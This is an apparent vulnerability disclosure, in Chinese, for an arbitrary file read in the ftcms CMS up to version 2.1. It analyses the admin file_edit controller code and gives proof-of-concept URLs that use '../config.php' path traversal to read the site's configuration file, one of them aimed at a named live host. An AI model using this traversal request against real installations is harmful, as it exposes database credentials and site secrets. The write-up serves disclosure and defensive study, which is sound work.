# ftcms存在任意文件读取漏洞

供应商：http://www.ftcms.cn/

软件下载链接：http://www.ftcms.cn/skin/ftcms_v2.1.zip

影响版本：ftcms<=2.1

## 1.漏洞分析

此任意文件读取漏洞的原理是使用后台模板函数修改本地文件造成的。接下来，根据代码分析漏洞是如何引起的。

首先，找到模板并修改文件代码。文件位置为admin/controllers/tp.php

```text
对应请求链接为
http://demo.ftcms.cn/admin/index.php/tp/file_edit/?style=template&tp=default&file=../config.php
```

数据库配置写入的相应方法是file_edit

```php
	 //编辑文件	 
   public  function file_edit(){
	         $this->load->helper('file');//加载文件辅助函数
            $data=$this->input->post();
            if(!empty($data)){//写入文件信息
				 $style = isset($data['info']['style']) && trim($data['info']['style']) ? trim($data['info']['style']) : '';
				 $file = isset($data['info']['file']) && trim($data['info']['file']) ? trim($data['info']['file']) : '';
				 $tp=$data['info']['tp'];
				  
				  $dir=$file;

				 if(write_file($dir, $data['info']['content'])){
				         $this->message('修改成功！',site_url($this->router->class.'/file_lists?style='.$style.'&tp='.$tp));
                 }else{

                       $this->message('修改失败 ！请检查文件权限'.$dir,site_url($this->router->class.'/file_lists?style='.$style.'&tp='.$tp));
                 }

			}else{
			     $style = isset($_GET['style']) && trim($_GET['style']) ? trim($_GET['style']) : '';
				 $file = isset($_GET['file']) && trim($_GET['file']) ? trim($_GET['file']) : '';
				 $data['tp']=$_GET['tp'];

				$dir=$file;
			    $data['file']=$file;
			    $data['style']=$style;
				$data['res']=read_file($dir);//获取文件内容
				
				$this->load->vars('data',$data);	
				$this->load->view($this->router->class.'/file_edit');
			}	
			
    }
```

![image](https://user-images.githubusercontent.com/54017627/168750656-e2bfe9fd-7514-410a-87a6-c124beaf51a4.png)

首先，将使用帮助类中的文件帮助程序函数

![image](https://user-images.githubusercontent.com/54017627/168750722-e1be432e-113d-43fb-b7dd-2bc232e68255.png)

然后在输入类中使用$this - >输入 - > post（）;从用户的帖子中获取所有数据的方法。根据数据内容是否为空，执行以下两个分支。当使用 get 方法或 post 数据为空时，将执行以下分支

![image](https://user-images.githubusercontent.com/54017627/168750763-705ee9a6-3394-42ec-81e9-684bc2ace29c.png)

![image](https://user-images.githubusercontent.com/54017627/168750787-afb179a3-44cb-4383-81e5-b24759cf6541.png)

首先，判断在 get 请求中是否设置了样式和文件这两个参数。如果是这样，请使用 trim 函数删除空格，否则它将为空。然后直接从 get 请求中获取 TP 参数。此参数未经过滤处理，也为后续漏洞利用奠定了基础

![image](https://user-images.githubusercontent.com/54017627/168750858-e2413fa4-2708-4df4-b893-f0995bc90e77.png)

然后将$file变量的内容赋给$dir变量

![image](https://user-images.githubusercontent.com/54017627/168750944-18da21aa-fe6c-4989-ac8f-f29326f4e002.png)

然后调用read_ file 函数读取指定路径文件的内容  

read_ 文件函数位于帮助类中。让我们跟随并分析它

![image](https://user-images.githubusercontent.com/54017627/168751031-1ac9cf5c-574c-4a16-be21-809d53bbe1da.png)

当文件存在时，首先判断它是否exists_ get_内容功能。如果存在，请使用file_ get_内容读取文件的内容。如果它不存在，则使用 fopen 来读取该文件。

![image](https://user-images.githubusercontent.com/54017627/168751092-1f518427-c9d3-4a4b-a4af-7e24c8f527dc.png)

最后，读取文件内容显示在视图中  

最终的 POC 如下所示

```text
http://demo.ftcms.cn/admin/index.php/tp/file_edit/?style=template&tp=default&file=dir
```

## 2.漏洞复现

### 2.1 登录
![image](https://user-images.githubusercontent.com/54017627/168751408-c95f1530-9eec-41f9-aaf1-7efab15f1f95.png)

### 2.2 请求配置文件

poc 是:

```text
http://ft.rapoo.top/admin/index.php/tp/file_edit/?style=template&tp=default&file=../config.php
```

![image](https://user-images.githubusercontent.com/54017627/168751488-9aeee6bf-6d1d-4a70-bdd1-200d6d0869fc.png)

